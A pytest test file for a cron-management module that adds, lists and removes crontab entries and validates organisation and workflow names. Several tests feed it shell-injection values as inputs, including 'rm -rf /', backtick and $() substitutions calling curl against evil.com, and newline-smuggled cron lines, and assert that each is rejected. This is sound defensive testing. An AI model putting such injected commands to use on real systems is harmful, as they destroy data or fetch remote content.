"""Tests for sable_platform.cron module."""
from __future__ import annotations

from unittest.mock import patch

import pytest

from sable_platform.cron import (
    CronEntry,
    add_entry,
    list_entries,
    remove_entry,
    SCHEDULE_PRESETS,
    _MARKER,
    _validate_identifier,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _mock_crontab(content: str = ""):
    """Return patches for _read_crontab and _write_crontab."""
    state = {"content": content}

    def read():
        return state["content"]

    def write(new_content):
        state["content"] = new_content

    return state, read, write


# ---------------------------------------------------------------------------
# Input validation
# ---------------------------------------------------------------------------

class TestValidateIdentifier:
    def test_accepts_alphanumeric(self):
        _validate_identifier("tig", "org")  # no raise

    def test_accepts_hyphens_underscores(self):
        _validate_identifier("solstitch", "org")
        _validate_identifier("weekly-loop", "workflow")

    def test_rejects_shell_injection_semicolon(self):
        with pytest.raises(ValueError, match="alphanumeric"):
            _validate_identifier("tig; rm -rf /", "org")

    def test_rejects_shell_injection_backtick(self):
        with pytest.raises(ValueError, match="alphanumeric"):
            _validate_identifier("`curl evil.com`", "workflow")

    def test_rejects_shell_injection_dollar(self):
        with pytest.raises(ValueError, match="alphanumeric"):
            _validate_identifier("$(whoami)", "org")

    def test_rejects_newline(self):
        with pytest.raises(ValueError, match="newline"):
            _validate_identifier("tig\n0 * * * * evil", "org")

    def test_rejects_colon(self):
        with pytest.raises(ValueError, match="alphanumeric"):
            _validate_identifier("tig:evil", "org")

    def test_rejects_spaces(self):
        with pytest.raises(ValueError, match="alphanumeric"):
            _validate_identifier("tig foundation", "org")

    def test_rejects_empty(self):
        with pytest.raises(ValueError, match="must not be empty"):
            _validate_identifier("", "org")


# ---------------------------------------------------------------------------
# CronEntry
# ---------------------------------------------------------------------------

class TestCronEntry:
    def test_to_line_format(self):
        entry = CronEntry(
            schedule="0 22 * * 4",
            command="/usr/bin/sable-platform workflow run weekly_client_loop --org tig",
            org="tig",
            workflow="weekly_client_loop",
        )
        line = entry.to_line()
        assert line.startswith("0 22 * * 4 ")
        assert "workflow run weekly_client_loop --org tig" in line
        assert f"{_MARKER}:tig:weekly_client_loop" in line


# ---------------------------------------------------------------------------
# list_entries
# ---------------------------------------------------------------------------

class TestListEntries:
    def test_empty_crontab(self):
        with patch("sable_platform.cron._read_crontab", return_value=""):
            assert list_entries() == []

    def test_parses_sable_entries(self):
        crontab = (
            "0 22 * * 4 /usr/bin/sable-platform workflow run weekly_client_loop --org tig "
            f"{_MARKER}:tig:weekly_client_loop\n"
        )
        with patch("sable_platform.cron._read_crontab", return_value=crontab):
            entries = list_entries()
            assert len(entries) == 1
            assert entries[0].org == "tig"
            assert entries[0].workflow == "weekly_client_loop"
            assert entries[0].schedule == "0 22 * * 4"

    def test_ignores_non_sable_entries(self):
        crontab = (
            "0 * * * * /usr/bin/some-other-tool\n"
            "0 22 * * 4 /usr/bin/sable-platform workflow run alert_check --org tig "
            f"{_MARKER}:tig:alert_check\n"
        )
        with patch("sable_platform.cron._read_crontab", return_value=crontab):
            entries = list_entries()
            assert len(entries) == 1
            assert entries[0].workflow == "alert_check"

    def test_parses_multiple_entries(self):
        crontab = (
            f"0 22 * * 4 /bin/sp workflow run weekly_client_loop --org tig {_MARKER}:tig:weekly_client_loop\n"
            f"0 6 * * * /bin/sp workflow run alert_check --org tig {_MARKER}:tig:alert_check\n"
        )
        with patch("sable_platform.cron._read_crontab", return_value=crontab):
            entries = list_entries()
            assert len(entries) == 2


# ---------------------------------------------------------------------------
# add_entry
# ---------------------------------------------------------------------------

class TestAddEntry:
    def test_adds_entry_to_empty_crontab(self):
        state, read, write = _mock_crontab("")
        with patch("sable_platform.cron._read_crontab", side_effect=read), \
             patch("sable_platform.cron._write_crontab", side_effect=write), \
             patch("sable_platform.cron._find_cli_binary", return_value="/usr/bin/sable-platform"):
            entry = add_entry("tig", "weekly_client_loop", "0 22 * * 4")
            assert entry.org == "tig"
            assert entry.workflow == "weekly_client_loop"
            assert entry.schedule == "0 22 * * 4"
            assert f"{_MARKER}:tig:weekly_client_loop" in state["content"]

    def test_adds_entry_to_existing_crontab(self):
        existing = "0 * * * * /usr/bin/other-tool\n"
        state, read, write = _mock_crontab(existing)
        with patch("sable_platform.cron._read_crontab", side_effect=read), \
             patch("sable_platform.cron._write_crontab", side_effect=write), \
             patch("sable_platform.cron._find_cli_binary", return_value="/usr/bin/sable-platform"):
            add_entry("tig", "alert_check", "daily")
            assert "/usr/bin/other-tool" in state["content"]
            assert f"{_MARKER}:tig:alert_check" in state["content"]

    def test_resolves_preset_name(self):
        state, read, write = _mock_crontab("")
        with patch("sable_platform.cron._read_crontab", side_effect=read), \
             patch("sable_platform.cron._write_crontab", side_effect=write), \
             patch("sable_platform.cron._find_cli_binary", return_value="/usr/bin/sable-platform"):
            entry = add_entry("tig", "weekly_client_loop", "weekly-thursday")
            assert entry.schedule == "0 22 * * 4"

    def test_rejects_duplicate(self):
        existing = (
            f"0 22 * * 4 /usr/bin/sable-platform workflow run weekly_client_loop --org tig "
            f"{_MARKER}:tig:weekly_client_loop\n"
        )
        state, read, write = _mock_crontab(existing)
        with patch("sable_platform.cron._read_crontab", side_effect=read), \
             patch("sable_platform.cron._write_crontab", side_effect=write), \
             patch("sable_platform.cron._find_cli_binary", return_value="/usr/bin/sable-platform"):
            with pytest.raises(ValueError, match="already exists"):
                add_entry("tig", "weekly_client_loop", "0 22 * * 4")

    def test_rejects_invalid_schedule(self):
        with pytest.raises(ValueError, match="5 fields"):
            add_entry("tig", "weekly_client_loop", "not a cron expression")

    def test_includes_extra_args_shell_quoted(self):
        state, read, write = _mock_crontab("")
        with patch("sable_platform.cron._read_crontab", side_effect=read), \
             patch("sable_platform.cron._write_crontab", side_effect=write), \
             patch("sable_platform.cron._find_cli_binary", return_value="/usr/bin/sable-platform"):
            entry = add_entry("tig", "prospect_diagnostic_sync", "daily",
                              extra_args="-c prospect_yaml_path=/path/to/tig.yaml")
            assert "prospect_yaml_path=/path/to/tig.yaml" in entry.command

    def test_rejects_shell_injection_in_org(self):
        with pytest.raises(ValueError, match="alphanumeric"):
            add_entry("tig; rm -rf /", "weekly_client_loop", "daily")

    def test_rejects_shell_injection_in_workflow(self):
        with pytest.raises(ValueError, match="alphanumeric"):
            add_entry("tig", "$(curl evil.com)", "daily")

    def test_rejects_newline_injection_in_org(self):
        with pytest.raises(ValueError, match="newline"):
            add_entry("tig\n0 * * * * malicious", "weekly_client_loop", "daily")

    def test_command_values_are_shell_quoted(self):
        state, read, write = _mock_crontab("")
        with patch("sable_platform.cron._read_crontab", side_effect=read), \
             patch("sable_platform.cron._write_crontab", side_effect=write), \
             patch("sable_platform.cron._find_cli_binary", return_value="/usr/bin/sable-platform"):
            entry = add_entry("tig", "weekly_client_loop", "0 22 * * 4")
            # Verify shell quoting is applied (values should be quoted or safe)
            assert "workflow run" in entry.command

    def test_single_read_for_add(self):
        """add_entry should call _read_crontab exactly once (no TOCTOU)."""
        call_count = 0
        def counting_read():
            nonlocal call_count
            call_count += 1
            return ""

        with patch("sable_platform.cron._read_crontab", side_effect=counting_read), \
             patch("sable_platform.cron._write_crontab", side_effect=lambda c: None), \
             patch("sable_platform.cron._find_cli_binary", return_value="/usr/bin/sable-platform"):
            add_entry("tig", "weekly_client_loop", "daily")
            assert call_count == 1

    def test_find_cli_binary_not_found(self):
        state, read, write = _mock_crontab("")
        with patch("sable_platform.cron._read_crontab", side_effect=read), \
             patch("sable_platform.cron._write_crontab", side_effect=write), \
             patch("shutil.which", return_value=None):
            with pytest.raises(FileNotFoundError, match="not found on PATH"):
                add_entry("tig", "weekly_client_loop", "daily")


# ---------------------------------------------------------------------------
# remove_entry
# ---------------------------------------------------------------------------

class TestRemoveEntry:
    def test_removes_matching_entry(self):
        existing = (
            f"0 22 * * 4 /usr/bin/sable-platform workflow run weekly_client_loop --org tig "
            f"{_MARKER}:tig:weekly_client_loop\n"
        )
        state, read, write = _mock_crontab(existing)
        with patch("sable_platform.cron._read_crontab", side_effect=read), \
             patch("sable_platform.cron._write_crontab", side_effect=write):
            assert remove_entry("tig", "weekly_client_loop") is True
            assert "weekly_client_loop" not in state["content"]

    def test_preserves_other_entries(self):
        existing = (
            "0 * * * * /usr/bin/other-tool\n"
            f"0 22 * * 4 /usr/bin/sable-platform workflow run weekly_client_loop --org tig "
            f"{_MARKER}:tig:weekly_client_loop\n"
            f"0 6 * * * /usr/bin/sable-platform workflow run alert_check --org tig "
            f"{_MARKER}:tig:alert_check\n"
        )
        state, read, write = _mock_crontab(existing)
        with patch("sable_platform.cron._read_crontab", side_effect=read), \
             patch("sable_platform.cron._write_crontab", side_effect=write):
            remove_entry("tig", "weekly_client_loop")
            assert "/usr/bin/other-tool" in state["content"]
            assert "alert_check" in state["content"]
            assert "weekly_client_loop" not in state["content"]

    def test_returns_false_when_not_found(self):
        state, read, write = _mock_crontab("")
        with patch("sable_platform.cron._read_crontab", side_effect=read), \
             patch("sable_platform.cron._write_crontab", side_effect=write):
            assert remove_entry("tig", "nonexistent") is False

    def test_rejects_injection_in_remove(self):
        with pytest.raises(ValueError, match="alphanumeric"):
            remove_entry("tig; evil", "weekly_client_loop")


# ---------------------------------------------------------------------------
# Schedule presets
# ---------------------------------------------------------------------------

class TestPresets:
    def test_all_presets_are_valid_cron(self):
        for name, expr in SCHEDULE_PRESETS.items():
            fields = expr.split()
            assert len(fields) == 5, f"Preset {name!r} has {len(fields)} fields"

    def test_weekly_thursday_is_day_4(self):
        assert SCHEDULE_PRESETS["weekly-thursday"] == "0 22 * * 4"
